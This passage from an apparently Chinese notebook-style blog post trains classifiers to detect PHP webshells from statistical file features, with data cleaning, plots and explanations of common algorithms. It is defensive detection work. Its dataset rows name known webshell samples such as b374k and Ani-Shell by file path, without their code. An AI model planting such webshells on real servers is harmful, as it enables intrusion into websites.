class="line">dataSet.head()</span><br></pre></td></tr></table></figure><table><thead><tr><th></th><th>label</th><th>file</th><th>Length</th><th>Entropy</th><th>LongestWord</th><th>SignatureNasty</th><th>Compression</th></tr></thead><tbody><tr><td>0</td><td>1</td><td>buf/shell/small.php</td><td>15410</td><td>5.548091</td><td>129</td><td>4</td><td>0.254315</td></tr><tr><td>1</td><td>1</td><td>buf/shell/spy.php</td><td>73950</td><td>5.505197</td><td>153</td><td>30</td><td>0.284043</td></tr><tr><td>2</td><td>1</td><td>buf/shell/b374k-mini-shell-php.php.php</td><td>14427</td><td>6.036039</td><td>79</td><td>2</td><td>0.763083</td></tr><tr><td>3</td><td>1</td><td>buf/shell/b374k-2.4.php</td><td>101330</td><td>5.772806</td><td>5847</td><td>55</td><td>0.326221</td></tr><tr><td>4</td><td>1</td><td>buf/shell/Ani-Shell.php</td><td>87016</td><td>6.008172</td><td>3147</td><td>53</td><td>0.212260</td></tr></tbody></table><h4 id="查看数据的整体状况"><a href="#查看数据的整体状况" class="headerlink" title="查看数据的整体状况"></a>查看数据的整体状况</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">dataSet.info()</span><br><span class="line">&lt;class &#39;pandas.core.frame.DataFrame&#39;&gt;</span><br><span class="line">RangeIndex: 7847 entries, 0 to 7846</span><br><span class="line">Data columns (total 7 columns):</span><br><span class="line">label             7847 non-null int64</span><br><span class="line">file              7847 non-null object</span><br><span class="line">Length            7847 non-null int64</span><br><span class="line">Entropy           7847 non-null float64</span><br><span class="line">LongestWord       7847 non-null int64</span><br><span class="line">SignatureNasty    7847 non-null int64</span><br><span class="line">Compression       7847 non-null float64</span><br><span class="line">dtypes: float64(2), int64(4), object(1)</span><br><span class="line">memory usage: 429.2+ KB</span><br></pre></td></tr></table></figure><h4 id="查看数据中两种数据所占比例"><a href="#查看数据中两种数据所占比例" class="headerlink" title="查看数据中两种数据所占比例"></a>查看数据中两种数据所占比例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dataSet[&quot;label&quot;].value_counts() &#x2F; len(dataSet)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0    0.747037</span><br><span class="line">1    0.252963</span><br><span class="line">Name: label, dtype: float64</span><br></pre></td></tr></table></figure><h4 id="有三个特征格式不正确，进行转换"><a href="#有三个特征格式不正确，进行转换" class="headerlink" title="有三个特征格式不正确，进行转换"></a>有三个特征格式不正确，进行转换</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">def traInt(x):</span><br><span class="line">    try:</span><br><span class="line">        r &#x3D; np.int64(x)</span><br><span class="line">        return r</span><br><span class="line">    except:</span><br><span class="line">        return 0</span><br><span class="line">    </span><br><span class="line">def tranFlo(x):</span><br><span class="line">    try:</span><br><span class="line">        r &#x3D; np.float64(x)</span><br><span class="line">        return r</span><br><span class="line">    except:</span><br><span class="line">        return 0</span><br><span class="line"></span><br><span class="line">dataSet[&quot;LongestWord&quot;] &#x3D; dataSet[&quot;LongestWord&quot;].map(lambda x:traInt(x))</span><br><span class="line">dataSet[&quot;SignatureNasty&quot;] &#x3D; dataSet[&quot;SignatureNasty&quot;].map(lambda x:traInt(x))</span><br><span class="line">dataSet[&quot;Compression&quot;] &#x3D; dataSet[&quot;Compression&quot;].map(lambda x:tranFlo(x))</span><br><span class="line">dataSet.head()</span><br></pre></td></tr></table></figure><table><thead><tr><th></th><th>label</th><th>file</th><th>Length</th><th>Entropy</th><th>LongestWord</th><th>SignatureNasty</th><th>Compression</th></tr></thead><tbody><tr><td>0</td><td>1</td><td>buf/shell/small.php</td><td>15410</td><td>5.548091</td><td>129</td><td>4</td><td>0.254315</td></tr><tr><td>1</td><td>1</td><td>buf/shell/spy.php</td><td>73950</td><td>5.505197</td><td>153</td><td>30</td><td>0.284043</td></tr><tr><td>2</td><td>1</td><td>buf/shell/b374k-mini-shell-php.php.php</td><td>14427</td><td>6.036039</td><td>79</td><td>2</td><td>0.763083</td></tr><tr><td>3</td><td>1</td><td>buf/shell/b374k-2.4.php</td><td>101330</td><td>5.772806</td><td>5847</td><td>55</td><td>0.326221</td></tr><tr><td>4</td><td>1</td><td>buf/shell/Ani-Shell.php</td><td>87016</td><td>6.008172</td><td>3147</td><td>53</td><td>0.212260</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">dataSet.info()</span><br><span class="line">&lt;class &#39;pandas.core.frame.DataFrame&#39;&gt;</span><br><span class="line">RangeIndex: 7847 entries, 0 to 7846</span><br><span class="line">Data columns (total 7 columns):</span><br><span class="line">label             7847 non-null int64</span><br><span class="line">file              7847 non-null object</span><br><span class="line">Length            7847 non-null int64</span><br><span class="line">Entropy           7847 non-null float64</span><br><span class="line">LongestWord       7847 non-null int64</span><br><span class="line">SignatureNasty    7847 non-null int64</span><br><span class="line">Compression       7847 non-null float64</span><br><span class="line">dtypes: float64(2), int64(4), object(1)</span><br><span class="line">memory usage: 429.2+ KB</span><br></pre></td></tr></table></figure><h3 id="分析数据"><a href="#分析数据" class="headerlink" title="分析数据"></a>分析数据</h3><h4 id="五个特征对于两类文件的平均值"><a href="#五个特征对于两类文件的平均值" class="headerlink" title="五个特征对于两类文件的平均值"></a>五个特征对于两类文件的平均值</h4><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/0658d3d97b758ac770f4ac5a760f71629d7bcd.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/0658d3d97b758ac770f4ac5a760f71629d7bcd.png" srcset="data:image/png;base64,666" alt="image.png"></p><p>红色代表WebShell，绿色代表正常文件，下面雷同</p><h4 id="导入画图的库"><a href="#导入画图的库" class="headerlink" title="导入画图的库"></a>导入画图的库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import seaborn as sns</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">%matplotlib inline</span><br><span class="line"></span><br><span class="line">plt.style.use(&#39;seaborn&#39;)</span><br><span class="line">sns.set_context(&quot;poster&quot;)</span><br><span class="line">sns.set(font_scale&#x3D;2)</span><br><span class="line">pd.set_option(&#39;display.max_columns&#39;, 500)</span><br></pre></td></tr></table></figure><h4 id="将各个特征以图形化的界面展现出来"><a href="#将各个特征以图形化的界面展现出来" class="headerlink" title="将各个特征以图形化的界面展现出来"></a>将各个特征以图形化的界面展现出来</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sns.kdeplot(dataSet.Length[dataSet.label &#x3D;&#x3D; 1].values, color&#x3D;&quot;r&quot;, shade&#x3D;True)</span><br><span class="line">sns.kdeplot(dataSet.Length[dataSet.label &#x3D;&#x3D; 0].values, color&#x3D;&quot;b&quot;, shade&#x3D;True)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;matplotlib.axes._subplots.AxesSubplot at 0x7fb15c8a99e8&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/fc36f4af4d5cedc063289a08910ab80f9655d2.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/fc36f4af4d5cedc063289a08910ab80f9655d2.png" srcset="data:image/png;base64,666" alt="png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sns.kdeplot(dataSet.Entropy[dataSet.label &#x3D;&#x3D; 1].values, color&#x3D;&quot;r&quot;, shade&#x3D;True)</span><br><span class="line">sns.kdeplot(dataSet.Entropy[dataSet.label &#x3D;&#x3D; 0].values, color&#x3D;&quot;b&quot;, shade&#x3D;True)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;matplotlib.axes._subplots.AxesSubplot at 0x7fb15c842588&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/23fc63ded772b3f807c01f9def01dcbeb16580.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/23fc63ded772b3f807c01f9def01dcbeb16580.png" srcset="data:image/png;base64,666" alt="png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sns.kdeplot(dataSet.LongestWord[dataSet.label &#x3D;&#x3D; 1].values, color&#x3D;&quot;r&quot;, shade&#x3D;True)</span><br><span class="line">sns.kdeplot(dataSet.LongestWord[dataSet.label &#x3D;&#x3D; 0].values, color&#x3D;&quot;b&quot;, shade&#x3D;True)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;matplotlib.axes._subplots.AxesSubplot at 0x7fb15c82eb38&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/cfb9cbadf09ad92055450588b85ad2de56c955.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/cfb9cbadf09ad92055450588b85ad2de56c955.png" srcset="data:image/png;base64,666" alt="png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sns.kdeplot(dataSet.SignatureNasty[dataSet.label &#x3D;&#x3D; 1].values, color&#x3D;&quot;r&quot;, shade&#x3D;True)</span><br><span class="line">sns.kdeplot(dataSet.SignatureNasty[dataSet.label &#x3D;&#x3D; 0].values, color&#x3D;&quot;b&quot;, shade&#x3D;True)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;matplotlib.axes._subplots.AxesSubplot at 0x7fb15a774dd8&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/d1eda1ee3b6eec1aeb9b6958fe2c510bb6cd15.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/d1eda1ee3b6eec1aeb9b6958fe2c510bb6cd15.png" srcset="data:image/png;base64,666" alt="png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sns.kdeplot(dataSet.Compression[dataSet.label &#x3D;&#x3D; 1].values, color&#x3D;&quot;r&quot;, shade&#x3D;True)</span><br><span class="line">sns.kdeplot(dataSet.Compression[dataSet.label &#x3D;&#x3D; 0].values, color&#x3D;&quot;b&quot;, shade&#x3D;True)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;matplotlib.axes._subplots.AxesSubplot at 0x7fb15a6caf60&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/b10d536369c2295f6a546a8a72b6f5861ece51.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/b10d536369c2295f6a546a8a72b6f5861ece51.png" srcset="data:image/png;base64,666" alt="png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from mpl_toolkits.mplot3d import Axes3D</span><br><span class="line"></span><br><span class="line">fig &#x3D; plt.figure(figsize&#x3D;(7,5))</span><br><span class="line">ax &#x3D; Axes3D(fig)</span><br><span class="line">ax.scatter(dataSet.LongestWord[dataSet.label &#x3D;&#x3D; 1].values, dataSet.Compression[dataSet.label &#x3D;&#x3D; 1],</span><br><span class="line">           dataSet.Length[dataSet.label &#x3D;&#x3D; 1].values,c&#x3D;&#39;r&#39;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;mpl_toolkits.mplot3d.art3d.Path3DCollection at 0x7fb15a618908&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/f33c3f8cfaf9dbe35ea4a2404ded2723bd278b.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/f33c3f8cfaf9dbe35ea4a2404ded2723bd278b.png" srcset="data:image/png;base64,666" alt="png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fig &#x3D; plt.figure(figsize&#x3D;(7,5))</span><br><span class="line">ax &#x3D; Axes3D(fig)</span><br><span class="line">ax.scatter(dataSet.LongestWord[dataSet.label &#x3D;&#x3D; 0].values, dataSet.Compression[dataSet.label &#x3D;&#x3D; 0],</span><br><span class="line">           dataSet.Length[dataSet.label &#x3D;&#x3D; 0].values,c&#x3D;&#39;y&#39;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;mpl_toolkits.mplot3d.art3d.Path3DCollection at 0x7fb158c9beb8&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/ae6b0daad2c6975674f02dcb816dce34bb3cec.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/ae6b0daad2c6975674f02dcb816dce34bb3cec.png" srcset="data:image/png;base64,666" alt="png"></p><p>从图片中可以看出大部分的WebShell还是可以被区别出来的</p><h4 id="计算出各个参数之间的皮尔逊系数"><a href="#计算出各个参数之间的皮尔逊系数" class="headerlink" title="计算出各个参数之间的皮尔逊系数"></a>计算出各个参数之间的皮尔逊系数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">correlations &#x3D; dataSet.corr()</span><br><span class="line">correlations[&quot;label&quot;].sort_values(ascending&#x3D;False)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">label             1.000000</span><br><span class="line">SignatureNasty    0.391205</span><br><span class="line">Length            0.330383</span><br><span class="line">Compression       0.307060</span><br><span class="line">Entropy           0.251075</span><br><span class="line">LongestWord       0.219952</span><br><span class="line">Name: label, dtype: float64</span><br></pre></td></tr></table></figure><h4 id="按shell占比例将数据均匀分开"><a href="#按shell占比例将数据均匀分开" class="headerlink" title="按shell占比例将数据均匀分开"></a>按shell占比例将数据均匀分开</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from sklearn.model_selection import StratifiedShuffleSplit</span><br><span class="line"></span><br><span class="line">split &#x3D; StratifiedShuffleSplit(n_splits&#x3D;1, test_size&#x3D;0.2, random_state&#x3D;36)</span><br><span class="line">for train_index, test_index in split.split(dataSet, dataSet[&quot;label&quot;]):</span><br><span class="line">    train_set &#x3D; dataSet.loc[train_index]</span><br><span class="line">    test_set &#x3D; dataSet.loc[test_index]</span><br><span class="line">train_set.head(10)</span><br></pre></td></tr></table></figure><table><thead><tr><th></th><th>label</th><th>file</th><th>Length</th><th>Entropy</th><th>LongestWord</th><th>SignatureNasty</th><th>Compression</th></tr></thead><tbody><tr><td>4313</td><td>0</td><td>buf/common/Joomla_3.9.4-Stable-Full_Package/tw…</td><td>4038</td><td>5.136905</td><td>42</td><td>0</td><td>0.309807</td></tr><tr><td>2509</td><td>0</td><td>buf/common/Joomla_3.9.4-Stable-Full_Package/P2…</td><td>1345</td><td>5.223217</td><td>54</td><td>0</td><td>0.259480</td></tr><tr><td>7767</td><td>0</td><td>buf/common/phpmyadmin-master/RelationCleanup.php</td><td>15364</td><td>5.352547</td><td>51</td><td>0</td><td>0.073809</td></tr><tr><td>5180</td><td>0</td><td>buf/common/Joomla_3.9.4-Stable-Full_Package/de…</td><td>1333</td><td>5.224251</td><td>50</td><td>0</td><td>0.439610</td></tr><tr><td>4260</td><td>0</td><td>buf/common/Joomla_3.9.4-Stable-Full_Package/pd…</td><td>966</td><td>5.280909</td><td>40</td><td>0</td><td>0.548654</td></tr><tr><td>4419</td><td>0</td><td>buf/common/Joomla_3.9.4-Stable-Full_Package/jq…</td><td>3753</td><td>5.312287</td><td>47</td><td>0</td><td>0.356515</td></tr><tr><td>3485</td><td>0</td><td>buf/common/Joomla_3.9.4-Stable-Full_Package/in…</td><td>6869</td><td>5.321246</td><td>54</td><td>0</td><td>0.324793</td></tr><tr><td>6366</td><td>0</td><td>buf/common/WordPress-master/content-page (3).php</td><td>884</td><td>5.089887</td><td>32</td><td>0</td><td>0.488688</td></tr><tr><td>1894</td><td>1</td><td>buf/shell/a/php/f3b9d1c8e18467eecb31e0bb2c39c9…</td><td>1449</td><td>5.194428</td><td>122</td><td>0</td><td>0.641822</td></tr><tr><td>72</td><td>1</td><td>buf/shell/bypass-waf-2015-06-16-03.php</td><td>460</td><td>5.464458</td><td>86</td><td>0</td><td>0.645652</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">train_set.info()</span><br><span class="line">&lt;class &#39;pandas.core.frame.DataFrame&#39;&gt;</span><br><span class="line">Int64Index: 6277 entries, 4313 to 6235</span><br><span class="line">Data columns (total 7 columns):</span><br><span class="line">label             6277 non-null int64</span><br><span class="line">file              6277 non-null object</span><br><span class="line">Length            6277 non-null int64</span><br><span class="line">Entropy           6277 non-null float64</span><br><span class="line">LongestWord       6277 non-null int64</span><br><span class="line">SignatureNasty    6277 non-null int64</span><br><span class="line">Compression       6277 non-null float64</span><br><span class="line">dtypes: float64(2), int64(4), object(1)</span><br><span class="line">memory usage: 392.3+ KB</span><br></pre></td></tr></table></figure><h4 id="将X，Y分离"><a href="#将X，Y分离" class="headerlink" title="将X，Y分离"></a>将X，Y分离</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x_train &#x3D; train_set.drop(&quot;label&quot;, axis&#x3D;1).drop(&quot;file&quot;, axis&#x3D;1)</span><br><span class="line">y_train &#x3D; train_set.label</span><br><span class="line">x_test &#x3D; test_set.drop(&quot;label&quot;, axis&#x3D;1).drop(&quot;file&quot;, axis&#x3D;1)</span><br><span class="line">y_test &#x3D; test_set.label</span><br></pre></td></tr></table></figure><h4 id="载入性能考核函数，并对结果进行评定"><a href="#载入性能考核函数，并对结果进行评定" class="headerlink" title="载入性能考核函数，并对结果进行评定"></a>载入性能考核函数，并对结果进行评定</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from sklearn.metrics import precision_score, recall_score, f1_score</span><br><span class="line"></span><br><span class="line">def score(name, y_test, y_pred):</span><br><span class="line">    accu_score &#x3D; precision_score(y_test, y_pred)</span><br><span class="line">    reca_score &#x3D; recall_score(y_test, y_pred)</span><br><span class="line">    fin_score &#x3D; f1_score(y_test, y_pred)</span><br><span class="line">    print(&quot;&#123;&#125;:\n精度：&#123;&#125;\n召回率：&#123;&#125;\n综合得分：&#123;&#125;&quot;.format(name, accu_score, reca_score, fin_score))</span><br></pre></td></tr></table></figure><h3 id="分类算法介绍"><a href="#分类算法介绍" class="headerlink" title="分类算法介绍"></a>分类算法介绍</h3><h4 id="最有影响力的十大数据挖掘算法中包含的分类算法"><a href="#最有影响力的十大数据挖掘算法中包含的分类算法" class="headerlink" title="最有影响力的十大数据挖掘算法中包含的分类算法"></a>最有影响力的十大数据挖掘算法中包含的分类算法</h4><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/1c4ad6511de1caa5487dac031ab5793a83e9df.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/1c4ad6511de1caa5487dac031ab5793a83e9df.png" srcset="data:image/png;base64,666" alt="image.png"></p><h4 id="k近邻算法"><a href="#k近邻算法" class="headerlink" title="k近邻算法"></a>k近邻算法</h4><p>K最近邻(k-Nearest Neighbor，KNN)分类算法，是一个理论上比较成熟的方法，也是最简单的机器学习算法之一。该方法的思路是：如果一个样本在特征空间中的k个最相似(即特征空间中最邻近)的样本中的大多数属于某一个类别，则该样本也属于这个类别。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/ae9376a87df7891ed4cb0cf6cbfe1df6a9885c.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/ae9376a87df7891ed4cb0cf6cbfe1df6a9885c.png" srcset="data:image/png;base64,666" alt="image.png"></p><h4 id="SVM法"><a href="#SVM法" class="headerlink" title="SVM法"></a>SVM法</h4><p>支持向量机(support vector machine)是一种分类算法，通过寻求结构化风险最小来提高学习机泛化能力，实现经验风险和置信范围的最小化，从而达到在统计样本量较少的情况下，亦能获得良好统计规律的目的。通俗来讲，它是一种二类分类模型，其基本模型定义为特征空间上的间隔最大的线性分类器，即支持向量机的学习策略便是间隔最大化，最终可转化为一个凸二次规划问题的求解。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/a586832db90542a3019dbcb9dd825aa8830253.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/a586832db90542a3019dbcb9dd825aa8830253.png" srcset="data:image/png;base64,666" alt="image.png"></p><h4 id="决策树"><a href="#决策树" class="headerlink" title="决策树"></a>决策树</h4><p>决策树(Decision Tree）是在已知各种情况发生概率的基础上，通过构成决策树来求取净现值的期望值大于等于零的概率，评价项目风险，判断其可行性的决策分析方法，是直观运用概率分析的一种图解法。是一种十分常用的监管学习式分类方法。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/dcc96ecae52d4c8e8a97cb5ef09ad19295714f.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/dcc96ecae52d4c8e8a97cb5ef09ad19295714f.png" srcset="data:image/png;base64,666" alt="image.png"></p><h4 id="朴素贝叶斯"><a href="#朴素贝叶斯" class="headerlink" title="朴素贝叶斯"></a>朴素贝叶斯</h4><p>朴素贝叶斯方法是一种监督学习算法，它基于贝叶斯定理给定类变量值的每对特征之间的条件独立性的“简单”假设。在给定类变量$y$和从属特征向量$x*{1}$到$x*{n}$，贝叶斯定理表明了以下关系：</p><p>$P(y \mid x_1, \dots, x_n) = \frac{P(y) P(x_1, \dots x_n \mid y)}                                 {P(x_1, \dots, x_n)}$                                  使用简单的条件独立假设</p><p>$P(x_i | y, x_1, \dots, x*{i-1}, x*{i+1}, \dots, x_n) = P(x_i | y),$</p><p>对于所有$i$，这种关系被简化为</p><p>$P(y \mid x_1, \dots, x_n) = \frac{P(y) \prod_{i=1}^{n} P(x_i \mid y)}                                 {P(x_1, \dots, x_n)}$                                 由于$P(x_1, \dots, x_n)$在输入时是常数，我们可以使用以下分类规则：</p><p>$\begin{align}\begin{aligned}P(y \mid x_1, \dots, x_n) \propto P(y) \prod*{i=1}^{n} P(x_i \mid y)\Downarrow\hat{y} = \arg\max_y P(y) \prod*{i=1}^{n} P(x_i \mid y),\end{aligned}\end{align}$</p><p>我们可以使用最大后验（MAP）估计来估计$$P(y)和$P(x_i \mid y)$; 前者是训练集中$y$类的相对频率。</p><h4 id="神经网络"><a href="#神经网络" class="headerlink" title="神经网络"></a>神经网络</h4><p>神经网络由“神经元”构成，一个“神经元”是一个运算单元f，该运算单元在神经网络中称作激活函数，激活函数通常设定为sigmoid函数（也可以设为其他函数），它可以输入一组加权系数的量，对这个量进行映射，如果这个映射结果达到或者超过了某个阈值，输出一个量。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/62aaef99f05ce2ffd71b53d9520a63a3b4dfba.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/62aaef99f05ce2ffd71b53d9520a63a3b4dfba.png" srcset="data:image/png;base64,666" alt="image.png"></p><h4 id="逻辑回归"><a href="#逻辑回归" class="headerlink" title="逻辑回归"></a>逻辑回归</h4><p>逻辑回归的模型是一个非线性模型，sigmoid函数，又称逻辑回归函数。但它其实是基于线性回归模型，因为除去sigmoid映射函数关系，其他的步骤，算法都是线性回归的。所以可以说，逻辑回归，都是以线性回归为理论支持的。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/b52d16402fa013a342e56dc76c2a3da1835528.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/b52d16402fa013a342e56dc76c2a3da1835528.png" srcset="data:image/png;base64,666" alt="image.png"></p><h4 id="随机森林"><a href="#随机森林" class="headerlink" title="随机森林"></a>随机森林</h4><p>随机森林是一个包含多个决策树的分类器， 并且其输出的类别是由个别树输出的类别的众数而定。随机森林是集成学习思想下的产物，将许多棵决策树整合成森林，并合起来用来预测最终结果。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/2ebb369a9842386bda8e1906ebd6d159d290f4.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/2ebb369a9842386bda8e1906ebd6d159d290f4.png" srcset="data:image/png;base64,666" alt="image.png"></p><h4 id="adaboost"><a href="#adaboost" class="headerlink" title="adaboost"></a>adaboost</h4><p>Adaboost是一种迭代算法，其核心思想是针对同一个训练集训练不同的分类器(弱分类器)，然后把这些弱分类器集合起来，构成一个更强的最终分类器（强分类器）。其算法本身是通过改变数据分布来实现的，它根据每次训练集之中每个样本的分类是否正确，以及上次的总体分类的准确率，来确定每个样本的权值。将修改过权值的新数据集送给下层分类器进行训练，最后将每次训练得到的分类器最后融合起来，作为最后的决策分类器。使用adaboost分类器可以排除一些不必要的训练数据特征，并放在关键的训练数据上面。</p><h4 id="xgboost"><a href="#xgboost" class="headerlink" title="xgboost"></a>xgboost</h4><p>该算法思想就是不断地添加树，不断地进行特征分裂来生长一棵树，每次添加一个树，其实是学习一个新函数，去拟合上次预测的残差。当我们训练完成得到k棵树，我们要预测一个样本的分数，其实就是根据这个样本的特征，在每棵树中会落到对应的一个叶子节点，每个叶子节点就对应一个分数，最后只需要将每棵树对应的分数加起来就是该样本的预测值。</p><h4 id="gbdt-lr"><a href="#gbdt-lr" class="headerlink" title="gbdt+lr"></a>gbdt+lr</h4><p>GBDT算法的图示部分形如一棵倒过来的树，其根部即代表训练GBDT算法的原始数据集，经过树算法对原始数据的切分，可得到代表不同新特征的叶子节点。再将GBDT所得的叶子节点输入LR算法，经过线性分析和sigmoid映射，即可得到模型分类结果。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/6b7733f605cce271cb308b3beebeb231b5fc93.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/6b7733f605cce271cb308b3beebeb231b5fc93.png" srcset="data:image/png;base64,666" alt="image.png"></p><h3 id="分类算法尝试"><a 